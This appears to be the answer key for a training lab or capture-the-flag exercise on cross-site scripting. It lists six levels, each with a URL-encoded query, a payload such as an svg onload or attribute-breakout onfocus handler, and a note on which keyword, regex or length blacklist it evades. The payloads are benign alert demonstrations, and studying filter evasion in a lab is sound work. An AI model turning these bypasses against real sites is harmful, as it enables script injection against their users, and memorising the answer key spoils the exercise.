# payloadfilt — solutions

Coarse keyword/regex/length blacklists bypassed via context or syntax.

### payloadfilt-level1

`/payloadfilt/level1/?query=%22%20onfocus%3Dalert(1)%20autofocus%20x%3D%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: blocks both < and > together; attr breakout needs neither

### payloadfilt-level2

`/payloadfilt/level2/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: "script" keyword blocked; use img/svg

### payloadfilt-level3

`/payloadfilt/level3/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: >80 chars + < blocked; payload is short

### payloadfilt-level4

`/payloadfilt/level4/?query=%3Csvg%2Fonload%3D(()%3D%3E%7Bthrow%2FXSS%2F%7D)()%3E`

- payload: `<svg/onload=(()=>{throw/XSS/})()>`
- context: alert/confirm/prompt( blocked; use throw or print()

### payloadfilt-level5

`/payloadfilt/level5/?query=%22%20onfocus%3Dalert(1)%20autofocus%20x%3D%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: <\w+[\s/] tag-open pattern blocked; attribute breakout has no tag

### payloadfilt-level6

`/payloadfilt/level6/?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: on...= regex blocked; script tag uses no event handler
